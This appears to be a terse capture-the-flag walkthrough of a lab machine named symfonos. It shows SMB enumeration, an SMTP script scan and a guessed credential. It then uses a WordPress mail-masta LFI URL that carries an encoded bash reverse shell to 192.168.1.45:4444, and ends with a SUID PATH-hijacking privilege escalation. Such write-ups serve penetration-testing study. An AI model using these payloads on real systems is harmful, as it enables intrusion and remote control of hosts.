
````bash
crackmapexec smb 192.168.1.38 -u '' -p '' --shares
````

![Pasted image 20250221152211.png](../../assets/Pasted%20image%2020250221152211.png)
![Pasted image 20250221152237.png](../../assets/Pasted%20image%2020250221152237.png)
usuarios
![Pasted image 20250221152431.png](../../assets/Pasted%20image%2020250221152431.png)
usuarios validos
![Pasted image 20250221152653.png](../../assets/Pasted%20image%2020250221152653.png)
`helios:qwerty`
ahora podemo ver el share helios
![Pasted image 20250221153018.png](../../assets/Pasted%20image%2020250221153018.png)
![Pasted image 20250221174949.png](../../assets/Pasted%20image%2020250221174949.png)

commandos posibles en el server 25

````bash
sudo nmap -p25 -script 'smtp-*' 192.168.1.38
````

![Pasted image 20250221154608.png](../../assets/Pasted%20image%2020250221154608.png)

usuarios en el equipo
![Pasted image 20250221160232.png](../../assets/Pasted%20image%2020250221160232.png)
`_apt, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-bus-proxy, systemd-network, systemd-resolve, systemd-timesync, uucp, webmaster, www, www-data`

![Pasted image 20250221203602.png](../../assets/Pasted%20image%2020250221203602.png)
![Pasted image 20250221212832.png](../../assets/Pasted%20image%2020250221212832.png)

![Pasted image 20250221215908.png](../../assets/Pasted%20image%2020250221215908.png)

````url
view-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&command=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.45%2F4444%200%3E%261%22
````

![Pasted image 20250221220352.png](../../assets/Pasted%20image%2020250221220352.png)
![Pasted image 20250221221001.png](../../assets/Pasted%20image%2020250221221001.png)
now we can connect to the database 'wordpress' with this creds
![Pasted image 20250221225421.png](../../assets/Pasted%20image%2020250221225421.png)
lets try to crack it, but we cant, so enum more, there is a SUID file thats looks quite interesting, we can check the printables characters, looks like is doing a curl, but without the absolute path, so we can create "curl" to preform a "path hijacking"

````bash
export PATH=.:$PATH
chmod +x curl
/opt/statuscheck
````

![Pasted image 20250221231235.png](../../assets/Pasted%20image%2020250221231235.png)
nice
![Pasted image 20250221231252.png](../../assets/Pasted%20image%2020250221231252.png)
